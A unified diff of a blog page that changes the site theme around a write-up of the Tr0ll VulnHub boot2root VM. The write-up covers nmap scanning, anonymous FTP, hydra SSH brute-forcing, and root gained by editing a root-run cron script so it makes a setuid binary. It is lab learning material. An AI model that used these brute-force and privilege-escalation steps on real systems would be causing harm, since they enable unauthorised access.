@@ -1,32 +1,30 @@
-<!doctype html><html lang=en>
-<head>
-<title>
-taming the troll ::
-#!/bin/note
-— a checkbox uncheckers notepad
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>taming the troll | #!/bin/note
 </title>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="foreword Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction.
-">
-<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
-<meta name=robots content="noodp">
-<link rel=canonical href=https://leonjza.github.io/blog/2014/08/15/taming-the-troll/>
-<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
-<link rel=stylesheet href=https://leonjza.github.io/style.css>
-<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
-<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="taming the troll">
-<meta name=twitter:description content="foreword
+<meta name=keywords content>
+<meta name=description content="foreword
 Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction.">
-<meta property="og:title" content="taming the troll">
+<meta name=author content="Leon Jacobs">
+<link rel=canonical href=https://leonjza.github.io/blog/2014/08/15/taming-the-troll/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://leonjza.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="taming the troll">
 <meta property="og:description" content="foreword
 Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction.">
 <meta property="og:type" content="article">
@@ -34,67 +32,87 @@ Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. 
 <meta property="article:published_time" content="2014-08-15T07:12:03+00:00">
 <meta property="article:modified_time" content="2014-08-15T07:12:03+00:00"><meta property="og:site_name" content="#!/bin/note
 ">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="taming the troll">
+<meta name=twitter:description content="foreword
+Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"taming the troll","item":"https://leonjza.github.io/blog/2014/08/15/taming-the-troll/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"taming the troll","name":"taming the troll","description":"foreword Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction.\n","keywords":[],"articleBody":"foreword Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction.\nnomad, promise As usual, I downloaded the VM, extracted the .rar and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:\nroot@kali:~# nmap -v --reason -sV 192.168.56.101 -p- PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack (protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.4.7 ((Ubuntu)) So, ssh, ftp, and http. Naturally my first reaction was to inspect the web service.\n  The robots.txt file revealed:\nUser-agent:* Disallow: /secret Browsing to /secret revealed yet another interesting piece of art:\n  Right… A little early to be ‘mad’, but nonetheless, lets move on.\nanonny-mouse ftp A quick and lazy google for vsftpd 3.0.2 exploit didn’t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:\nroot@kali:~# ftp 192.168.56.101 Connected to 192.168.56.101. 220 (vsFTPd 3.0.2) Name (192.168.56.101:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp ls 500 Illegal PORT command. ftp: bind: Address already in use ftp passive Passive mode on. ftp ls 227 Entering Passive Mode (192,168,56,101,231,190) 150 Here comes the directory listing. -rwxrwxrwx 1 1000 0 8068 Aug 10 00:43 lol.pcap 226 Directory send OK. ftp get lol.pcap local: lol.pcap remote: lol.pcap 227 Entering Passive Mode (192,168,56,101,189,113) 150 Opening BINARY mode data connection for lol.pcap (8068 bytes). 226 Transfer complete. 8068 bytes received in 0.00 secs (21294.3 kB/s) ftp bye 221 Goodbye. Well that worked, and showed that we have a file lol.pcap to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called secret_stuff.txt that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:\n  Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to http://192.168.56.101/sup3rs3cr3tdirlol/. In this path there was a binary called roflmao. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:\nroot@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao --2014-08-15 07:57:56-- http://192.168.56.101/sup3rs3cr3tdirlol/roflmao Connecting to 192.168.56.101:80... connected. HTTP request sent, awaiting response... 200 OK Length: 7296 (7.1K) Saving to: `roflmao' 100%[======] 7,296 --.-K/s in 0s 2014-08-15 07:57:56 (826 MB/s) - `roflmao' saved [7296/7296] root@kali:~/Desktop/Tr0ll# chmod +x roflmao root@kali:~/Desktop/Tr0ll# ./roflmao Find address 0x0856BF to proceed Nice. 0x0856BF is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with @barrebas on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried http://192.168.56.101/0x0856BF/:\n  nohydraplz Cool! At this stage I was pretty sure there was not much left to gain shell. The folder good_luck had a file called which_one_lol.txt with contents:\nmaleus ps-aux felux Eagle11 genphlux List of passwords? Dunno. The folder this_folder_contains_the_password had a file Pass.txt with contents:\nGood_job_:) At this stage I figured this had to be either a nicely provided wordlist for some hydra action on the ftp || ssh service. So naturally, I copied the information to a file called list.txt (also made a copy of the genphlux word so that its on its own line), and fired up hydra on ssh:\nroot@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh Hydra v7.6 (c)2013 by van Hauser/THC \u0026 David Maciejak - for legal purposes only [DATA] attacking service ssh on port 22 [VERBOSE] Resolving addresses ... done [ATTEMPT] target 192.168.56.101 - login \"maleus\" - pass \"maleus\" - 1 of 169 [child 0] [ATTEMPT] target 192.168.56.101 - login \"ps-aux\" - pass \"maleus\" - 2 of 169 [child 0] [ATTEMPT] target 192.168.56.101 - login \"felux\" - pass \"maleus\" - 3 of 169 [child 0] [ATTEMPT] target 192.168.56.101 - login \"Eagle11\" - pass \"maleus\" - 4 of 169 [child 0] [ATTEMPT] target 192.168.56.101 - login \"genphlux - pass \"maleus\" - 5 of 169 [child 0] [ATTEMPT] target 192.168.56.101 - login \"genphlux\" - pass \"maleus\" - 6 of 169 [child 0] [ATTEMPT] target 192.168.56.101 - login \"usmc8892\" - pass \"maleus\" - 7 of 169 [child 0] [ERROR] could not connect to target port 22 [ERROR] ssh protocol error [VERBOSE] Retrying connection for child 0 [RE-ATTEMPT] target 192.168.56.101 - login \"usmc8892\" - pass \"maleus\" - 7 of 169 [child 0] [ERROR] could not connect to target port 22 [ERROR] ssh protocol error [VERBOSE] Retrying connection for child 0 [RE-ATTEMPT] target 192.168.56.101 - login \"usmc8892\" - pass \"maleus\" - 7 of 169 [child 0] Err, the sudden errors only meant one thing… fail2ban.\nroot@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22 PORT STATE SERVICE REASON 22/tcp filtered ssh no-response So, this was the first part that frustrated me and had me going “seriously… :\". Maybe this was actually a list of ftp creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.\nfirst shell I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it’s thing. Eventually, it was apparent that none of these words as a username/password combination was the correct one.\nReturning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to read everything), that the password may be in this folder (this_folder_contains_the_password). Get it, the Pass.txt is the password…\nRight, so I changed hydra slightly to use Pass.txt as a password and continued to brute with the original list.txt as usernames:\nroot@kali:~# hydra -v -V -u -L list -p \"Pass.txt\" -t 1 -u 192.168.56.101 ssh Hydra v7.6 (c)2013 by van Hauser/THC \u0026 David Maciejak - for legal purposes only [DATA] 1 task, 1 server, 13 login tries (l:13/p:1), ~13 tries per task [DATA] attacking service ssh on port 22 [VERBOSE] Resolving addresses ... done [ATTEMPT] target 192.168.56.101 - login \"maleus\" - pass \"Pass.txt\" - 1 of 13 [child 0] [ATTEMPT] target 192.168.56.101 - login \"ps-aux\" - pass \"Pass.txt\" - 2 of 13 [child 0] [ATTEMPT] target 192.168.56.101 - login \"felux\" - pass \"Pass.txt\" - 3 of 13 [child 0] [...] [22][ssh] host: 192.168.56.101 login: overflow password: Pass.txt Yay overflow:Pass.txt should get us a session via ssh:\nroot@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101 overflow@192.168.56.101's password: Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686) [...] Could not chdir to home directory /home/overflow: No such file or directory $ id uid=1002(overflow) gid=1002(overflow) groups=1002(overflow) … and root And so it was time for classic enumeration again. The first strange thing was the fact that it appeared as if all the /home directories apart from /home/troll was deleted. Weird. Other than that, there were a whole bunch of users according to /etc/passwd, and I can’t run anything as root via sudo.\nThere was a file in /opt/ called lmao.py, however I did not have access to read it. Soooo, more enumeration.\nsuddenly\nBroadcast Message from root@trol (somewhere) at 16:05 ... TIMES UP LOL! Connection to 192.168.56.101 closed by remote host. Connection to 192.168.56.101 closed. root@kali:~# Urgh. Turns out, something is killing my ssh session every 5 minutes. Oh my word, was that annoying. I could handle everything the VM’s offered, but this was probably the worst part of it.\nEventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the thing I should be finding has a more recent timestamp:\noverflow@troll:/$ find / -executable -type f 2 /dev/null | egrep -v \"^/bin|^/var|^/etc|^/usr\" | xargs ls -lh | grep Aug -rwxrwxrwx 1 root root 145 Aug 14 13:11 /lib/log/cleaner.py -rwx--x--x 1 root root 117 Aug 10 02:11 /opt/lmao.py -rwxr-xr-x 1 root root 2.4K Aug 27 2013 /sbin/installkernel -rwxrwxrwx 1 troll root 7.9K Aug 10 00:43 /srv/ftp/lol.pcap A few interesting results came from that, however, the one that held the golden nugget was /lib/log/cleaner.py. During my enumeration I noticed that /tmp got cleaned out at a really strange time as I was still trying to less a file in there, however, it just disappeared.\nAnyways, as cleaner.py was owned by root and running os.system, I just modified it to prepare me a classic getroot binary:\n#!/usr/bin/env python import os import sys try: os.system('chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot ') except: sys.exit() I waited for that annoying ‘Times UP’ message, and inspected /var/tmp:\noverflow@troll:/$ ls -lah /var/tmp/ total 24K drwxrwxrwt 2 root root 4.0K Aug 14 13:11 . drwxr-xr-x 12 root root 4.0K Aug 10 03:56 .. -rwxrwxrwx 1 root root 34 Aug 13 01:16 cleaner.py.swp -rwsr-xr-x 1 root root 7.2K Aug 14 13:09 getroot -rw-rw-r-- 1 overflow overflow 71 Aug 14 13:09 sh.c overflow@troll:/$ /var/tmp/getroot # # id uid=0(root) gid=1002(overflow) groups=0(root),1002(overflow) # ls /root proof.txt # cat /root/proof.txt Good job, you did it! 702a8c18d29c6f3ca0d99ef5712bfbdc # for the curious That really annoying session that keeps dying? Turns out its /opt/lmao.py to blame:\n# cat /opt/lmao.py #!/usr/bin/env python import os os.system('echo \"TIMES UP LOL!\"|wall') os.system(\"pkill -u 'overflow'\") sys.exit() # Thanks @maleus21 for the VM!\n","wordCount":"1662","inLanguage":"en","datePublished":"2014-08-15T07:12:03Z","dateModified":"2014-08-15T07:12:03Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2014/08/15/taming-the-troll/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
 </head>
-<body class=dark-theme>
-<div class=container>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
 <header class=header>
-<span class=header__inner>
-<a href=/ class=logo style=text-decoration:none>
-<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
-</span>
-<span class=logo__text>#!/bin/note
-</span>
-<span class=logo__cursor></span>
+<nav class=nav>
+<div class=logo>
+<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
+ (Alt + H)">#!/bin/note
 </a>
-<span class=header__right>
-<nav class=menu>
-<ul class="menu__inner menu__inner--desktop">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
-</ul>
-<ul class="menu__inner menu__inner--mobile">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
-</ul>
-</nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
 </span>
-<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
-</span>
-</span>
-</span>
-</header>
-<div class=content>
-<div class=post>
-<h1 class=post-title>taming the troll</h1>
-<div class=post-meta>
-<span class=post-date>
-2014-08-15
-</span>
-<span class=post-read-time>— 8 min read</span>
 </div>
-<div class=post-content>
-<h2>Table of Contents</h2>
-<aside class=table-of-contents><nav id=TableOfContents>
-<ul>
+<ul id=menu>
 <li>
-<ul>
-<li><a href=#foreword>foreword</a></li>
-<li><a href=#nomad-promise>nomad, promise</a></li>
-<li><a href=#anonny-mouse-ftp>anonny-mouse ftp</a></li>
-<li><a href=#nohydraplz>nohydraplz</a></li>
-<li><a href=#first-shell>first shell</a></li>
-<li><a href=#-and-root>&mldr; and root</a></li>
-<li><a href=#for-the-curious>for the curious</a></li>
-</ul>
+<a href=https://leonjza.github.io/about/ title="About Me">
+<span>About Me</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/archives title=Archive>
+<span>Archive</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/categories title=Categories>
+<span>Categories</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
 </li>
 </ul>
-</nav></aside>
-<h2 id=foreword>foreword</h2>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
+<h1 class=post-title>
+taming the troll
+</h1>
+<div class=post-meta>August 15, 2014&nbsp;·&nbsp;8 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2014-08-15-taming-the-troll.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
+</div>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#foreword aria-label=foreword>foreword</a></li>
+<li>
+<a href=#nomad-promise aria-label="nomad, promise">nomad, promise</a></li>
+<li>
+<a href=#anonny-mouse-ftp aria-label="anonny-mouse ftp">anonny-mouse ftp</a></li>
+<li>
+<a href=#nohydraplz aria-label=nohydraplz>nohydraplz</a></li>
+<li>
+<a href=#first-shell aria-label="first shell">first shell</a></li>
+<li>
+<a href=#-and-root aria-label="&amp;hellip; and root">&mldr; and root</a></li>
+<li>
+<a href=#for-the-curious aria-label="for the curious">for the curious</a>
+</li>
+</ul>
+</div>
+</details>
+</div>
+<div class=post-content><h2 id=foreword>foreword<a hidden class=anchor aria-hidden=true href=#foreword>#</a></h2>
 <p>Having recently started the road to <a href=http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/>OSCP</a>, <a href=https://twitter.com/Maleus21>@Maleus21</a> released <a href=http://vulnhub.com/entry/tr0ll-1,100/>Tr0ll</a> on <a href=https://twitter.com/VulnHub>@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>
-<h2 id=nomad-promise>nomad, promise</h2>
+<h2 id=nomad-promise>nomad, promise<a hidden class=anchor aria-hidden=true href=#nomad-promise>#</a></h2>
 <p>As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-
 
@@ -103,18 +121,18 @@ PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
 80/tcp open  http    syn-ack Apache httpd 2.4.7 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
 </code></pre></div><p>So, <code>ssh</code>, <code>ftp</code>, and <code>http</code>. Naturally my first reaction was to inspect the web service.</p>
-<figure class=left>
-<img src=/images/troll_web.png>
+<figure>
+<img loading=lazy src=/images/troll_web.png>
 </figure>
 <p>The <code>robots.txt</code> file revealed:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>User-agent:*
 Disallow: /secret
 </code></pre></div><p>Browsing to <code>/secret</code> revealed yet another <em>interesting</em> piece of art:</p>
-<figure class=left>
-<img src=/images/troll_secret_path.png>
+<figure>
+<img loading=lazy src=/images/troll_secret_path.png>
 </figure>
 <p>Right&mldr; A little early to be &lsquo;mad&rsquo;, but nonetheless, lets move on.</p>
-<h2 id=anonny-mouse-ftp>anonny-mouse ftp</h2>
+<h2 id=anonny-mouse-ftp>anonny-mouse ftp<a hidden class=anchor aria-hidden=true href=#anonny-mouse-ftp>#</a></h2>
 <p>A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ftp 192.168.56.101
 Connected to 192.168.56.101.
@@ -149,8 +167,8 @@ local: lol.pcap remote: lol.pcap
 ftp&gt; bye
 <span style=color:#ae81ff>221</span> Goodbye.
 </code></pre></div><p>Well that worked, and showed that we have a file <code>lol.pcap</code> to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called <code>secret_stuff.txt</code> that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:</p>
-<figure class=left>
-<img src=/images/troll_pcap.png>
+<figure>
+<img loading=lazy src=/images/troll_pcap.png>
 </figure>
 <p>Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to http://192.168.56.101/sup3rs3cr3tdirlol/. In this path there was a binary called <code>roflmao</code>. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
@@ -168,10 +186,10 @@ root@kali:~/Desktop/Tr0ll# chmod +x roflmao
 root@kali:~/Desktop/Tr0ll# ./roflmao
 Find address 0x0856BF to proceed
 </code></pre></div><p>Nice. <code>0x0856BF</code> is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with <a href=https://twitter.com/barrebas>@barrebas</a> on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried http://192.168.56.101/0x0856BF/:</p>
-<figure class=left>
-<img src=/images/troll_0x856bf.png>
+<figure>
+<img loading=lazy src=/images/troll_0x856bf.png>
 </figure>
-<h2 id=nohydraplz>nohydraplz</h2>
+<h2 id=nohydraplz>nohydraplz<a hidden class=anchor aria-hidden=true href=#nohydraplz>#</a></h2>
 <p>Cool! At this stage I was pretty sure there was not much left to gain shell. The folder <code>good_luck</code> had a file called <code>which_one_lol.txt</code> with contents:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>maleus
 ps-aux
@@ -215,7 +233,7 @@ PORT   STATE    SERVICE REASON
 22/tcp filtered ssh     no-response
 
 </code></pre></div><p>So, this was the first part that frustrated me and had me going <em>&ldquo;seriously&mldr; :"</em>. Maybe this was actually a list of <code>ftp</code> creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.</p>
-<h2 id=first-shell>first shell</h2>
+<h2 id=first-shell>first shell<a hidden class=anchor aria-hidden=true href=#first-shell>#</a></h2>
 <p>I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>
 <p>Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to <em>read</em> everything), that the password may be in this folder (<code>this_folder_contains_the_password</code>). Get it, the <code>Pass.txt</code> is the password&mldr;</p>
 <p>Right, so I changed <code>hydra</code> slightly to use <code>Pass.txt</code> as a password and continued to brute with the original <code>list.txt</code> as usernames:</p>
@@ -240,7 +258,7 @@ Welcome to Ubuntu 14.04.1 LTS <span style=color:#f92672>(</span>GNU/Linux 3.13.0
 Could not chdir to home directory /home/overflow: No such file or directory
 $ id
 uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>overflow<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>overflow<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>overflow<span style=color:#f92672>)</span>
-</code></pre></div><h2 id=-and-root>&mldr; and root</h2>
+</code></pre></div><h2 id=-and-root>&mldr; and root<a hidden class=anchor aria-hidden=true href=#-and-root>#</a></h2>
 <p>And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>
 <p>There was a file in <code>/opt/</code> called <code>lmao.py</code>, however I did not have access to read it. Soooo, more enumeration.</p>
 <p><em>suddenly</em></p>
@@ -292,7 +310,7 @@ Good job, you did it!
 
 702a8c18d29c6f3ca0d99ef5712bfbdc
 <span style=color:#75715e>#</span>
-</code></pre></div><h2 id=for-the-curious>for the curious</h2>
+</code></pre></div><h2 id=for-the-curious>for the curious<a hidden class=anchor aria-hidden=true href=#for-the-curious>#</a></h2>
 <p>That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># cat /opt/lmao.py</span>
 <span style=color:#75715e>#!/usr/bin/env python</span>
@@ -305,36 +323,49 @@ sys<span style=color:#f92672>.</span>exit()
 <span style=color:#75715e>#</span>
 </code></pre></div><p>Thanks <a href=https://twitter.com/maleus21>@maleus21</a> for the VM!</p>
 </div>
-<div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h>Read other posts</span>
-<hr>
-</div>
-<div class=pagination__buttons>
-<span class="button previous">
-<a href=https://leonjza.github.io/blog/2014/08/17/kali-linux-oracle-support/>
-<span class=button__icon>←</span>
-<span class=button__text>Kali Linux Oracle Support</span>
+<footer class=post-footer>
+<nav class=paginav>
+<a class=prev href=https://leonjza.github.io/blog/2014/08/17/kali-linux-oracle-support/>
+<span class=title>« Prev Page</span>
+<br>
+<span>Kali Linux Oracle Support</span>
 </a>
-</span>
-<span class="button next">
-<a href=https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/>
-<span class=button__text>Beating Xerxes2</span>
